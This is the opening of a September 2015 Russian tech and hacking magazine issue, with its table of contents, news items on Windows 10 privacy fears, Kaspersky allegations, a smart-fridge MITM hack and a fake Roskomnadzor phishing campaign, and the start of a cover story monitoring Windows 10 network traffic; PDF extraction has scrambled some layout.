                                                      СЕНТЯБРЬ 2015


             №200




                                          Пишем бот
                                                 для Telegram



                                              Превращаем
                                             флешку в USB
                                                   Rubber Ducky


                                               Вскрываем
                                                  известные
      Cover                                         криптолокеры
      Story

WINDOWS 10
ШПИОНИТ ЗА ТОБОЙ
О ЧЕМ НОВАЯ ОС СТУЧИТ В MS
Мы проверили слухи о том, что Windows следит за пользователями,
изучили подозрительную активность и расскажем, как ее пресечь
                                    СЕНТЯБРЬ 2015
          № 200





  MEGANEWS
Все новое за последний месяц

  ТАЙНАЯ ЖИЗНЬ WINDOWS 10
О чем Windows 10 стучит в Microsoft и как заставить его прекратить

  МАСТЕР-КЛЮЧ КО ВСЕМ КОМПЬЮТЕРАМ
Создаем мультизагрузочную флешку с набором полезностей

  ТЕЛЕГРАФИРУЕТ РОБОТ
Пишем бот для Telegram на Python

  ПАДЕНИЕ ASHLEY MADISON
Как хакеры разоблачили нечестный сайт знакомств и его пользователей

  СЛУШАЮ И ПОВИНУЮСЬ
Как китайская мода говорить с ботами покоряет мир

  ПО СЛЕДАМ СМАРТФОНА
Ищем, блокируем и стираем потерянный девайс

  КОПАЕМ ГЛУБЖЕ
Как работают механизмы прошивки, рутинга и восстановления Android

  ЕСТЬ ЛИ БУДУЩЕЕ У МОДУЛЬНЫХ СМАРТФОНОВ?
Колонка Евгения Зобнина

  КАРМАННЫЙ СОФТ
Выпуск #11. Юзабилити

  ДОЛОЙ СТОК!
10 причин установить CyanogenMod

  EASY HACK
Хакерские секреты простых вещей

  ОБЗОР ЭКСПЛОИТОВ
Анализ свеженьких уязвимостей

  ГАДКИЙ УТЕНОК
Превращаем обычную флешку в USB Rubber Ducky

  QUANTITY NE QUALITY
Колонка Юрия Гольцева

  КАМУФЛЯЖ ДЛЯ ПИНГВИНА
Настраиваем полнодисковое шифрование и анонимизацию уровня ОС

  X-TOOLS
Софт для взлома и анализа безопасности

  ЗАСТАВЬ МАЛВАРЬ ИГРАТЬ ПО ПРАВИЛАМ
Колонка Дениса Макрушина

  ДЕТИ ЛЕЙТЕНАНТА CRYPTOLOCKER`A
Вскрываем DirCrypt, TorLocker, TeslaCrypt, TorrentLocker, Critroni и CryptoWall

  СХОРОНЯЙ ПРАВИЛЬНО
Раскладываем пользовательскую информацию в Android по полочкам

  РОБОТИЗИРОВАННЫЕ ХУКИ
Перехватываем вызовы в ОС Android

  ЗЛЫЕ СМС
Исследуем скрытые механизмы работы с СМС в Android

  ЗАДАЧИ НА СОБЕСЕДОВАНИЯХ
Задачи от сервиса мобильного эквайринга Pay-Me и прославление победителей от Acronis

  *SH, ФАС!
Обзор альтернативных CLI-оболочек

  РУССКИЙ БРОНИРОВАННЫЙ DEBIAN
Как устроена новая модель управления доступом в Astra Linux SE

  НАСЛЕДНИКИ «ЭНИГМЫ»
Обзор современных криптосредств в Linux

 ИЩЕМ ПОМОЩНИКА
Подбираем бесплатную систему для help desk

  МЕРЯЕМ ПО-НОВОМУ
Обнаружение аномалий при помощи Kale

  ХАЙЛОАД БЕЗ ПРОБЛЕМ
Масштабируем твой сервис с помощью Amazon Elastic Beanstalk

  FAQ
Вопросы и ответы

 WWW2
Интересные веб-сервисы

  ТИТРЫ
Кто делает этот журнал
Мария «Mifrill» Нефедова                      Анатолий
nefedova.maria@gameland.ru                    Ализар
                                                         Новость ТОТАЛЬНАЯ ПАРАНОЙЯ:      месяца
 ТОРРЕНТ-ТРЕКЕРЫ
 БАНЯТ ПОЛЬЗОВАТЕЛЕЙ
WINDOWS 10

          еспокойство вокруг Windows 10 и некоторых ее функций не утихает.
         Подогревая всеобщую паранойю, Microsoft отказалась объяснять,
           что входит в состав регулярных объемистых патчей. К тому же все
          заметили, что ОС регулярно отсылает куда-то разнообразные дан-
         ные о системе и пользователе, генерируя огромный объем трафика.
 Больше всего эта ситуация волнует пользователей-пиратов, которые ждут, чтоБ
 нелицензионные игры вот-вот перестанут работать, пиратский софт удалится
 сам собой, а в дверь позвонят люди в погонах. Похоже, у некоторых не выдер-
 живают нервы. Так, ряд закрытых торрент-трекеров забанил всех пользовате-
 лей с Windows 10.
    Информация о том, что в Windows 10 есть некий встроенный «антипиратский
 рубильник», подняла волну негодования, смешанного с паранойей. Основные
 подозрения вызвал трафик, генерируемый ОС; функция шейринга Wi-Fi, кото-
  рая, по мнению многих, небезопасна; огромные патчи, содержимое которых —
  загадка. Если верить всему, что пишут, Windows 10 — настоящий монстр, ко-
 торый может удалить все скачанные с The Pirate Bay торренты и отслеживает
 нелицензионные игры.
    Издание Torrent Freak отмечает, что такое жуткое сгущение красок неумест-
  но, хотя изменения в Service Agreement действительно позволяют Microsoft ав-
томатически скачивать обновления ПО и вносить изменения в конфигурацию.
Однако соглашение касается не только Windows 10, но многих сервисов ком-
пании. И уж тем более ничто не указывает на желание Microsoft заняться отло-
вом пиратских версий игр.
   Однако общественность волнуется. И в первых рядах — владельцы тор-
рент-трекеров. Torrent Freak пишет, что за прошедшую неделю издание полу-
чило ряд сообщений о том, что владельцы закрытых трекеров решили банить
всех своих пользователей, сидящих на Windows 10. Другие закрытые ресурсы,
включая BB и FSC, тоже рассматривают подобную меру.
   Представители трекера iTS даже пояснили свою позицию на Reddit:


   «К сожалению, Microsoft решила поступиться всяческой защитой данных
   и теперь не только сама использует все, что может собрать, но и пере-
   дает это другим. В числе „других“ — одна из крупнейших антипиратских
   компаний MarkMonitor. Помимо прочего, Windows 10 отсылает содер-
   жимое жестких дисков напрямую на их серверы. Все это зашло слишком
   далеко и является реальной угрозой для таких сайтов, как наш. Поэтому
   мы вынуждены принять меры».



Torrent Freak пишет, что Microsoft действительно сотрудничает с компанией
MarkMonitor уже много лет. В частности, они совместно борются с мошенни-
ками, но речь никогда не шла о борьбе с пиратством. Но убеждать владельцев
трекеров не паниковать — затея, похоже, совершенно бесполезная. В их деле
паранойя вообще здоровое и почти нормальное явление.
  Тем не менее издание еще раз подчеркивает, что такие проблемы в целом
не новы для операционных систем Microsoft, и Windows 10 тоже можно настро-
ить нормально, чтобы личные данные пользователи никуда не «утекали». Вме-
сто раздачи банов лучше проинформировать пользователей о проблеме и дать
ссылки на гайд, где описано, как прекратить постоянную «утечку данных». Нашу
версию такого гайда читай в рубрике Cover Story.
В REUTERS ОБВИНИЛИ
«ЛАБОРАТОРИЮ КАСПЕРСКОГО»
В СОЗДАНИИ ФАЛЬШИВОЙ
МАЛВАРИ

          нформационное  агентство  Reuters, ссылаясь на информацию
            от двух анонимных, но доверенных источников, рассказало о том,
            что «Лаборатория Касперского» более десяти лет занимается соз-
          данием фальшивых вредоносов, чтобы навредить конкурентам и их
           пользователям. Опираясь на слова двух бывших сотрудников «Ла-
 боратории Касперского» (чьи имена не раскрываются), Reuters написало, чтоИ
 ЛК более десяти лет ведет скрытую войну против конкурирующих антивирусных
 разработчиков — Microsoft, AVG и Avast.
    «Лабораторию Касперского» обвинили в создании поддельной малвари, то
 есть изменении обычных, безобидных файлов таким образом, чтобы они вы-
 зывали ложноположительное (false positive) срабатывание антивирусного ПО.
 Ложноположительные срабатывания не просто портят репутацию компании,
 но усложняют жизнь пользователям, ведь, если антивирус вдруг «вылечивает»
 пару системных файлов, это может привести к полному падению системы.
   Основной пик такого рода атак, по словам Reuters, пришелся на 2009–2013
годы. Источники уверяют, что якобы сам Евгений Касперский лично предложил
такой способ борьбы с конкурентами, поскольку полагал, что другие антивирус-
ные компании попросту воруют технологии ЛК вместо того, чтобы создавать свои.
   Reuters также приводит слова сотрудников Microsoft, AVG и Avast. Предста-
вители антивирусной индустрии жалуются, что проблема ложноположитель-
ных срабатываний на самом деле существует даже сегодня и с ней довольно
сложно бороться. Впрочем, почему-то все они отказались давать комментарии
о гипотетической причастности «Лаборатории Касперского».
   «Лаборатория Касперского» официально опровергла обвинения, прозву-
чавшие в статье информационного агентства Reuters. Представители «Лабо-
ратории Касперского» дали официальный комментарий относительно публи-
кации Reuters, а Евгений Касперский, в свою очередь, посвятил случившемуся
развернутую публикацию в блоге, где подробно прошелся по всем нападкам,
сравнил их с другими теориями заговора и, конечно, заверил общественность
в том, что ничего похожего никогда не происходило.





                     «Все мы с таким волнением отно-
                     симся к виртуальной реальности,
                      потому что прогресс человеческо-
                        го общения становится все богаче
                     и богаче, появляются новые способы
                      делиться своими мыслями. Десять
                       лет назад на передовой был текст.
                     Сейчас это в основном фото и ви-
                        део. Главным образом — видео,
                     и мы видим огромный прирост в этой
                       области. Иммерсивный 3D-кон-
                        тент — логичный следующий шаг»

                                                                    Марк Цукерберг
                                 об Oculus Rift и планах Facebook на будущее
МИРОВЫЕ ДЕРЖАВЫ
ЗАКЛЮЧИЛИ ПАКТ
О НЕНАПАДЕНИИ
В КИБЕР-ПРОСТРАНСТВЕ

            вадцать стран мира, включая Россию и США, впервые согла-
            сились принять правила об ограничении кибератак друг против
             друга. «Пакт о ненападении» запрещает обвинять друг друга
            огульно в кибератаках, нападать на критически важную инфра-
             структуру, использовать любую хакерскую атаку как повод к от-
           ветному применению силы, вставлять «закладки» в IT-продукциюД
(последний пункт внесен по инициативе России). Доклад экспертов оказался
в распоряжении газеты «Коммерсант».
   Договор о намерениях составлен группой правительственных экспертов
ООН по международной информационной безопасности. Она представлена
двадцатью странами, среди них Россия, США, Китай, Великобритания, Фран-
ция, Бразилия, Япония, Южная Корея и Израиль. Но важнее всего, что пакт го-
товы подписать главные страны, которые проявляют наибольшую хакерскую
  активность: это Россия, США и Китай. Правда, пока что проект договора пред-
 усматривает добровольный характер соблюдения прописанных норм.
    Прийти к компромиссу страны заставило растущее количество киберугроз.
 Как сказано в докладе, «в глобальной среде информационно-коммуникацион-
 ных технологий (ИКТ) прослеживаются тенденции, вызывающие озабоченность,
 включая резкое увеличение количества инцидентов, связанных со злонамерен-
 ным использованием подобных технологий государствами и негосударствен-
 ными игроками». Также в докладе экспертов упоминается «рост вероятности
 использования ИКТ в террористических целях».
    По мнению экспертов, документ носит скорее декларативный характер и не под-
 разумевает оперативных мер. Посол по особым поручениям МИД РФ Андрей Крут-
  ских в интервью «Коммерсанту» сказал: «В идеале Россия предпочла бы юриди-
 чески обязывающую международную конвенцию под эгидой ООН». Тем не менее
 эксперт высоко оценивает важность нового договора: «Это уже третий по счету
 доклад группы правительственных экспертов, и, хотя первые два документа были
 крайне важными, этот по своей значимости просто революционен. Впервые уда-
 лось согласовать позиции двадцати государств (среди которых, помимо России,
 были США, Китай, развивающиеся страны) по очень деликатному и важному во-
 просу о применимости международного права в информационной сфере».
    Доклад передан Генеральному секретарю ООН для представления на 70‑й
 сессии Генеральной Ассамблеи ООН, которая состоится в конце сентября
 2015 года.

ТОНЧАЙШИЕ
СОЛНЕЧНЫЕ БАТАРЕИ
ПОКОРИЛИ KICKSTARTER

          а Kickstarter очередной хит — модульные солнечные батареи Yolk
            Solar Paper. Их толщина примерно соответствует толщине листа бу-
          маги — 1,5 мм.
            Современные солнечные батареи обычно либо слишком малы,
          чтобы зарядить сколь-нибудь серьезный гаджет, либо, наоборот,
 слишком велики, и их уже сложно назвать портативными. Батареи Yolk SolarН
  Paper, созданные корейским дизайнером Сунг Ун Чан (Sung Un Chang), — это
 золотая середина.
    Каждая батарея состоит из нескольких тончайших панелей-модулей, кото-
 рые крепятся друг к другу (или любым металлическим поверхностям) при по-
мощи магнитных граней. Размер каждой панели 9 x 19 x 1,1 см, вес 120 г. Всего
соединить можно четыре таких панели, каждая из которых обладает мощностью
2,5 Вт. То есть двух панелей будет достаточно, чтобы в солнечный день полу-
чить 5 Вт и зарядить от них iPhone 6 примерно за два часа (такие показатели
вполне сопоставимы с обычной сетевой зарядкой). Четыре панели и 10 Вт уже
могут эффективно зарядить iPad за четыре с половиной часа.
  Помимо модульности и компактности, Yolk Solar Paper обладают и другими
плюсами. Устройство оснащается не только магнитами, но и удобными крепле-
ниями, чтобы его можно было повесить на стену, рюкзак или куда-либо еще.
Панели защищены от влаги, то есть дождь в походе им не страшен, а при жела-
нии можно класть и на борт байдарки. Одна из панелей батареи оснащена не-
большим ЖК-экраном, который отображает характеристики тока, подаваемого
на устройство. Экран помогает сориентироваться в погодных условиях и рас-
положить батарею по отношению к свету оптимальным образом. Кроме того,
батарея включается автоматически, обнаружив вокруг себя достаточное коли-
чество света.
291 887         18мобильных зловредов                                «пиратских ссылок» появилось во втором                                  у Google просят удалить      квартале                             каждую секунду
   «Лаборатория Касперского»                      Корпорация Google опубликовала
опубликовала отчет по итогам второ-              ежемесячный отчет DMCA takedown
го квартала 2015 года. За три меся-                   notices, то есть статистику обраще-
ца эксперты компании обнаружили                ний правообладателей. В июле ком-
более 290 тысяч новых образцов                  пания получила около 47 миллионов
мобильной малвари, что почти в три              обращений по поводу удаления кон-
раза больше, чем в первом квартале                 тента, нарушающего чьи-то права.
2015 года. Лидируют в этом антитопе              Простая математика подсказывает,
потенциально опасные приложения                  что это восемнадцать ссылок в секун-
RiskTool (44,6%), на втором месте                    ду. Был установлен и новый рекорд —
потенциально нежелательные                      12,5 миллиона обращений за семь
рекламные приложения AdWare                     дней. Наиболее активными в данном
(19%) и замыкают тройку различные               вопросе по-прежнему остаются
трояны (12,4%).                                 группы RIAA, MPAA и BPI.
ДЕВУШКА НАПЕЧАТАЛА
ТУФЛИ С ХАКЕРСКИМИ
ИНСТРУМЕНТАМИ В КАБЛУКАХ

         итайская девушка-хакер под ником SexyCyborg реализовала кон-
         цептуальный проект, спрятав инструменты для пентестинга в туфли
         на каблуках. В две объемные платформы поместились беспроводной
        маршрутизатор TL—MR10U с прошивкой OpenWRT и встроенным ак-
         кумулятором (правая туфля), USB-кейлоггер для подключения к ком-
 пьютеру жертвы, Ethernet-кабель и набор отмычек  (левая туфля). На туфлеК
 можно запустить Wispi и Jasager и прогуляться по офису жертвы со снифером
 на ножке. В случае необходимости маршрутизатор заряжается от электриче-
 ской сети. В каждой платформе есть выдвижная часть, которую можно достать,
 даже не снимая обуви.
   SexyCyborg создала модель в 3D-редакторе и напечатала необходимые де-
тали. Для моддинга использовались туфли модели Wu Ying, названные в честь
знаменитого «скрытого удара», который мастер боевых искусств Хуан Фэйхун
(герой Джеки Чана) использовал для отвлечения соперника. «Идя в таких туф-
лях, я отвлекаю жертву верхней частью своего тела, и он не замечает реальной
опасности на ногах», — объясняет девушка.
   Хакеры используют различные методы социальной инженерии, чтобы про-
нести на охраняемую территорию инструменты для пентестинга. Ручная кладь
нередко осматривается охранниками на входе, поэтому маскировка маршру-
тизатора в туфлях — отличная находка: туфли «с секретом» выглядят невинно
и не вызывают подозрений.





ПЕРВЫЙ МЕСЯЦ ПРОДАЖ WINDOWS 10

   26 августа 2015 года Юсуф Мехди (Yusuf Mehdi), директор по маркетингу Windows, написал
у себя в твиттере, что Windows 10 набрала за месяц после релиза 75 000 000 установок. Поде-
лился Мехди и другой интересной статистикой.

                                          Windows 8 в прошлом набрала лишь
75 000 000установок Windows 10 набрала за первый месяц          40 000 000

Windows 10 работает           Более        уникальных      Среди устройств, получив-                             90 000
в     странах мира,            моделей ПК и планшетов       ших апгрейд до Windows 10, 192
то есть практически во всех      проапгрейдились                есть девайсы      года                                                        2007
странах вообще.               до Windows 10.                  выпуска.

Владельцы Xbox One             Cortana рассказала            Из Windows Store
настримили уже     года       уже больше                     скачали в  раз больше            122                  500 000              6
геймплея на компьютеры         анекдотов, отвечая             приложений для «десятки»,
с Windows 10.                  на запрос «tell me a joke».       чем для Windows 8.
 IPHONE 6 НА ВОДОРОДЕ
 РАБОТАЕТ НЕДЕЛЮ

          ританская фирма Intelligent Energy разработала топливную ячейку
          на водороде, которая органично вставляется в корпус iPhone 6 и обе-
          спечивает ему примерно семь дней непрерывной работы в интенсив-
         ном режиме.
                  Intelligent Energy — серьезная компания, имеющая портфель
 из 2000 патентов. Именно она выпускала модифицированные водородные так-Б
  си, которые развозили гостей во время Олимпийских игр 2012 года в Лондоне.
    Отличительная особенность батареи Intelligent Energy — она не требует из-
 менения конструкции смартфона и совместима даже с существующими моде-
 лями без всякого моддинга, не считая нескольких вентиляционных отверстий
 для водяных испарений, которые образуются при сжигании водорода.
   В нынешнем виде топливная ячейка не заменяет обычный литий-ионный
  аккумулятор, а дополняет его. По всей видимости, аккумулятор понадобится
 другой (ведь свободного места в телефоне нет), но разработчики пока не рас-
 крывают подробностей. Заправлять топливный элемент предполагается через
 аудиоразъем, который при этом потеряет свою исходную функцию. Запасной
 водород хранится в отдельном картридже.
  Фирма уже выпустила на рынок портативное зарядное устройство The Upp
для мобильных гаджетов. Оно тоже работает на водороде и подключается
к смартфону по USB. Информации о стоимости топливной ячейки пока нет.



                   «В результате захвата Mega китайскими
                    инвесторами, передавшими контроль
                   над сайтом в руки правительства
                  Новой Зеландии, а также по ряду
                     других конфиденциальных причин
                     я более не доверяю Mega. Не думаю,
                      что ваши данные на Mega теперь можно
                      считать сохранными».

                                                                        Ким Дотком,
                                                 создатель файлообменника Mega


УМНЫЙ ХОЛОДИЛЬНИК ВЫДАЛ
ХАКЕРАМ ПАРОЛЬ ОТ GMAIL

        олодильник был побежден хакерами из компании Pen Test Partners
        во время пентестерского конкурса на конференции DEF CON. Специ-
        алисты по безопасности после нескольких попыток сумели взломать
        холодильник Samsung и выманить у него учетные данные от аккаунта
         Gmail.
   Подключенный  к интернету холодильник авторизуется на сайте GoogleХ
Calendar, чтобы показывать хозяину информацию о текущих делах на встроен-
ном экране. Хотя в холодильнике реализована поддержка SSL, компания-про-
изводитель не позаботилась о правильной проверке сертификата при установке
защищенного соединения с сервером Google, что делает возможным проведе-
ние атаки MITM. Устройство подключается к сети по Wi-Fi, так что теоретически
провести атаку можно из-за пределов квартиры, от соседей или с улицы.
   Просканировав порты, хакеры нашли два сервиса на портах 4444 (SSL) и 8888.
Первый из них используется мобильным приложением, которое извлекает серти-
фикат из локального хранилища. Правда, им так и не удалось подобрать пароль
 для него. Также безуспешной оказалась попытка заменить прошивку холодильни-
  ка через поддельное обновление. Тем не менее MITM-атака признана успешной,
 поскольку холодильник все-таки выдал учетные данные от аккаунта Google.





КОМПЬЮТЕРНЫЕ ИГРЫ
СНИЖАЮТ ТЯГУ К ЕДЕ,
НАРКОТИКАМ
И СЕКСУ НА 20%

           сихологи из университета Плимута и Технологического универси-
           тета Квинсленда (Великобритания) тщательно изучили, какое воз-
          действие оказывает «Тетрис» на мозг человека. Оказалось, что игра
          на смартфоне в течение трех минут на 20% подавляет тягу к наркоти-
           кам, еде, сигаретам, алкоголю, сексу и другим активным действиям.
    Это первое исследование такого рода, проведенное на людях в естествен-П
 ной среде их обитания, за пределами лаборатории. Подопытные отчитывались
о субъективной тяге, в то же время получали по СМС указания играть в «Тетрис»
в случайные интервалы — семь раз в течение дня. В эксперименте принял уча-
стие 31 студент в возрасте 18–27 лет.
  В каждом третьем измерении у студентов была зарегистрирована тяга к раз-
личным веществам или действиям. В большинстве случаев это была тяга к еде,
но в 21% случаев тяга была классифицирована как наркотическая: кофе, сигаре-
ты, вино и пиво. В 16% тяга связана с конкретными действиями: желание спать,
играть в компьютерные игры, общаться с друзьями или заниматься сексом.
   Положительный эффект «Тетриса» со снижением тяги отмечен в течение
всех семи дней эксперимента. Cтуденты запускали игру в среднем по сорок
раз, но эффект так и не ослабел. Ученые предполагают, что игра в «Тетрис» ка-
ким-то образом интерферирует со страстным желанием человека сделать что-
то другое. Другими словами, мозг просто переключается на другую задачу и не-
много отвлекается от навязчивого желания.
   91%         16%
    российских
                           пользователей   пользователей                            Windows 10  считает интернет                            используютдополнением к своей                           браузер Edge
   памяти и мозгу
     «Лаборатория Касперского»                      Интересные данные приво-
  провела опрос, который наглядно                   дят компании Net Applications и
  показывает, что постоянный доступ                   StatCounter. Похоже, особой попу-
  к интернету нас избаловал и портит                лярности браузер Edge пока не за-
  память. Когда нам что-то нужно, 53%                воевал. По данным Net Applications,
  пользователей первым делом обра-               новый браузер в первые дни после
 щаются к интернету за информаци-                релиза ОС использовали 0,14% поль-
  ей, и лишь четыре человека из деся-                зователей, тогда как Windows 10 была
  ти сначала пытаются самостоятельно               установлена на 0,39% компьютеров.
  вспомнить нужное. Каждый пятый               В середине августа StatCounter сооб-
  пользователь забывает найденную                 щила, что доля Windows 10 выросла
 информацию почти сразу после                   до 4,4% рынка, но только 0,7% поль-
  использования. 90% опрошенных                   зователей перешли на Edge. Если
  считают, что в современном мире                  верить этой статистике, доля Edge на
  у людей слишком много контактных                рынке не растет, а падает.
  данных, чтобы помнить их все.
ФАЛЬШИВЫЙ
РОСКОМНАДЗОР
И БЛОКИРОВКА
«ВИКИПЕДИИ»

          Рунете произошла массовая рассылка писем от имени Роскомнадзора
           в адрес администраторов доменных имен в зоне.ru. Прикрываясь име-
         нем Федеральной службы по надзору в сфере связи, информационных
           технологий и массовых коммуникаций, злоумышленники потребова-
          ли от админов разместить на сервере «невинный» файл с названием
  reestr-id198617.php. Письма приходили с адреса zapret-info@roskomnadzor.org.В
    Массовая рассылка была сделана явно на волне информационного шума
 о блокировке «Википедии», которую попытался осуществить Роскомнадзор.
 Как известно, одна из статей русскоязычной версии энциклопедии, в которой
 содержалась подробная информация о наркотическом веществе чарас, была
признана противоправной и запрещенной к доступу на территории РФ. По-
скольку «Википедия» использует протокол шифрования HTTPS, то заблокиро-
вать одну страницу провайдеры не могли, так что утром 26 августа 2015 года
под блокировку попала вся энциклопедия.
   Блокировка продлилась недолго: вскоре Роскомнадзор пошел на попятную
и убрал «Википедию» из реестра, несмотря на то что редакторы «Википедии» зна-
чительно расширили статью и дополнили ее новыми разделами. Однако история
получила широкое освещение в СМИ и вызвала общественный резонанс, то есть
в массовое сознание проникла схема «районный суд — Роскомнадзор — блоки-
ровка». Эту схему, как мы видим, теперь используют в социальной инженерии.





                      «Есть два способа отвечать на кон-
                     куренцию. Первый — совершен-
                      ствовать себя и свой проект. Вто-
                   рой — пытаться вредить конкурентам.
                  Первый способ долгосрочно работа-
                          ет, второй — нет.
                     Как только вы смещаете фокус
                     с саморазвития на конкурентов, вы
                     впускаете в себя страх перед ними.
                Вы неосознанно приближаете то,
                      чего боитесь. Страх — это само
                  сбывающееся пророчество»

                                                                                   Павел Дуров
                                            об отключении Instagram ВКонтакте
CHROME ПОСТАВИЛ FLASH
 НА ПАУЗУ С ПЕРВОГО СЕНТЯБРЯ

          раузер Chrome с сентября 2015 года перестанет воспроизводить
         флеш-анимацию по умолчанию. Компания Google давно предупре-
         ждала издателей, чтобы те переделывали свой контент на HTML5. Для
          этого разработано несколько специализированных инструментов.
             Во-первых, все новые рекламные кампании, которые загружались
 в AdWords в формате Flash, автоматически конвертируются в HTML5. После 1Б
 сентября 2015 года автоматическая конвертация станет доступна для большин-
 ства действующих рекламных кампаний. Во-вторых, Google выпустила несколь-
 ко специальных инструментов для разработки рекламных баннеров в HTML5,
 в том числе для Google Web Designer и DoubleClick Studio.
    Из-за серьезных проблем с безопасностью и производительностью Flash
 все больше компаний принимают решение отказаться от поддержки этого
 формата. Например, такое решение принял гигант электронной коммерции
 Amazon, который запретил размещение флеш-баннеров на своем сайте.
БЛОКИРОВЩИКИ
РЕКЛАМЫ СРАВНИЛИ
ПО ПРОИЗВОДИТЕЛЬНОСТИ

          езависимый разработчик по имени Реймонд из Малайзии провел
          сравнительное тестирование десяти самых популярных расширений
          для блокировки рекламы к браузерам Chrome и Firefox. Измерялась
           скорость загрузки страницы (среднее время после десяти загрузок),
          пиковый объем выделяемой оперативной памяти и пиковая нагрузка
 на процессор. Тестирование проводилось на обычном ноутбуке с процессо-Н
 ром Core Duo 2,2 ГГц, четырьмя гигабайтами ОЗУ и подключением к интернету
 по Wi-Fi. Браузеры — Chrome 44 и Firefox 40.
    На всех тестируемых сайтах отмечено значительное сокращение времени
 загрузки страницы (примерно в три раза). Среди расширений особенной мед-
лительностью работы выделяется Adblock Plus, а эффективнее всех работает
µBlock Origin, который обеспечил скорость загрузки страницы в среднем на 0,4
с быстрее остальных. Преимущество µBlock Origin характерно и для Chrome,
и для Firefox. Оперативную память лучше всех экономит расширение Ghostery.





РАВЕНСТВО И БАЛАНС В APPLE

   Компания Apple представила ежегодный отчет о так называемом личностном многообразии.
Эта статистика призвана продемонстрировать, что компания набирает на работу не только
белых мужчин и не допускает подобной дискриминации.

 Суммарно в подразделениях Apple
 по всему миру работают около

                                                женщин            11 000                                 было нанято за последний год, что
                                     почти в два раза больше прошло-100 000  человек.                            годнего показателя (6 500)

В этом году      Однако 69%       Лидирующие     60 из 83 высших
на работу взяли   нанятых за год      посты по-преж-   должностных лиц
на 50% боль-     сотрудников —     нему занимают    компании тоже бе-
ше чернокожих                 мужчины, 55%      мужчины (в 72%   лые мужчины, жен-и на 66% латино-                 из них белые.        случаев), 63%    щина там вообщеамериканцев.                                    из них белые.     всего одна.
Сцена





          84ckf1r3
      84ckf1r3@gmail.com

ТАЙНАЯ
ЖИЗНЬ
WINDOWS 10

О ЧЕМ WINDOWS 10 СТУЧИТ В MICROSOFT
И КАК ЗАСТАВИТЬ ЕЕ ПРЕКРАТИТЬ
С момента своего появления Windows был естествен-
ной средой обитания зловредов всех мастей. Похоже,
новая версия этой операционки сама стала одним
из троянов. Сразу после установки чистая систе-
ма ведет себя подозрительно. Данные рекой льются
на десятки серверов Microsoft и партнерских компа-
ний. Мы решили разобраться с жалобами на шпион-
ские замашки «десятки» и узнали, что и куда она от-
правляет.

MICROSOFT > NSA
Первые сообщения о странном поведении Windows 10 появились еще на эта-
пе знакомства с Technical Preview. Значительный трафик в ней создается по-
стоянно — даже когда не запущено ни одно приложение для работы в сети.
Тогда такое поведение списывали на сбор статистики, необходимой для от-
ладки. В Microsoft изучали поведение нового продукта на разных конфигураци-
ях, а пользователи играли роль бета-тестеров. Вроде бы все логично. Однако
с выходом релиза ничего не изменилось и жалоб стало только больше.
   «В прошлые выходные я обновил Windows 8 на лэптопе моего сына до Windows
10. Сегодня в первый рабочий день мне пришло письмо из Microsoft с темой
„Еженедельный отчет об активности“. В нем были подробнейшие сведения
о действиях сына за ноутбуком: когда и сколько он за ним сидел, какие прило-
жения использовал и как долго, что искал в Сети, какие сайты посещал и мно-
гое другое. Я был крайне возмущен, поскольку не собирался следить за своим
ребенком. В Microsoft мне ответили, что если я не хочу получать подобных пи-
сем, то мне следует указать это в настройках семейного аккаунта через свою
учетную запись. В Windows 8 такой проблемы не было». Это отрывок из письма
друга известного писателя и активиста Кори Доктороу, опубликованное в бло-
ге Boing Boing. Многие обозреватели утверждают, что эти сведения о пользо-
вателях по-прежнему собираются — независимо от настроек аккаунта. Если
что-то и можно отключить, то это отчеты, которые приходят на почту.Самое ин-
тересное, что сбор различной информации встроенными средствами Windows
10 подробно описан в «Заявлении о конфиденциальности». Конечно, боль-
шинство не станет его читать, а среди ознакомившихся будет много недоуме-
вающих. Формулировки в объемном тексте используются хитрые и размытые.
Из них трудно понять, что именно изменится в плане приватности с переходом
на Windows 10. Если кратко, то о ней можно будет забыть. Правозащитники схо-
дятся во мнении, что система сразу начинает собирать все данные, которые
только может получить.





Заявление об отсутствии конфиденциальности


Вот список их основных типов.

Биометрические:
•  образец голоса и произношения определенных слов;
•  образец почерка (рукописного ввода);
•  образцы набираемых текстов в любом приложении.

Геолокационные:
•  информация о текущем местоположении;
•  история местоположений с указанием временных меток.
Технические:
•  данные об оборудовании, включая идентификаторы устройств;
•  сведения о подключенных сетях (проводных и беспроводных);
•  сведения телеметрии;
•  данные от любых встроенных датчиков.
   Поведенческий анализ:
•  история поисковых запросов;
•  история посещенных веб-страниц;
•  время старта Windows и завершения работы;
•  время запуска и закрытия каждого приложения.

Покупательская активность:
•  загрузки приложений из фирменного магазина;
•  переход по ссылкам контекстной рекламы;
•  переход по ссылкам персонализированной рекламы.

Перечень можно продолжить, но и такого набора достаточно, чтобы начать
собственное исследование. Забегая вперед, отметим, что часть обвинений
в адрес Windows 10 все-таки не подтвердилась. Например, чешское издание
AE News предполагает, что ОС выполняет отправку изображения с веб-камеры
на серверы Microsoft. В нашем тесте система отреагировала на подключение
камеры лишь установкой драйверов — никаких посторонних действий с ней за-
регистрировано не было ни сразу, ни потом.

НАБЛЮДЕНИЕ ЗА НАБЛЮДАТЕЛЕМ
Привычных инструментов в арсенале хакера предостаточно для изучения любо-
го софта. Тестовый комп с чистым SSD, виртуальная машина, снифер Wireshark,
HTTP-прокси и дебаггер Fiddler, монитор сетевых соединений TCPView, а также
программы для создания снимков реестра и мелкие вспомогательные утилиты.
Мы старались использовать версии, не требующие установки. Исключение со-
ставили только Wireshark и Fiddler из-за специфики их работы. Эти программы
оставили напоследок, чтобы большая часть тестирования выполнялась на со-
вершенно чистой системе. Сетевой трафик анализировался как в настройках
Windows 10 по умолчанию, так и после поэтапного отключения всех следящих
функций.
  Из официальных документов следует, что за пользователем следят: сама
Windows, глубоко интегрированный поиск Bing, голосовой помощник Cortana,
служба MSN, пакет Office, клиент облачного хранилища OneDrive, почтовый
клиент Outlook, а также Skype, Silverlight и Xbox Live. Подробнее об этом напи-
сано на сайте Microsoft (http://www.microsoft.com/ru-ru/privacystatement/Default.
aspx). Посмотрим, как именно происходит сбор данных.





Первый старт Windows 10


Выполнив чистую установку сборки 10240, мы стали наблюдать за ее сете-
вым поведением с помощью TCPView. Никаких других действий при этом
не выполнялось. Поначалу все было тихо — как в «семерке». Лишь фирмен-
ный магазин приложений показывал готовность получить данные через сеть
доставки контента от Akamai Technologies.Когда уже стало надоедать сидеть
в засаде, внезапно ожил системный процесс \Windows\System32\svchost.
exe. Он установил подключение к удаленному узлу 191.232.139.254 и отпра-
вил на него 7,5 Кбайт.
Затишье перед бурей





Первый буревестник


Можно было узнать принадлежность IP-адреса через сервис WHOIS, но спра-
шивать Shodan информативнее.Как стало ясно из описания, это робот поис-
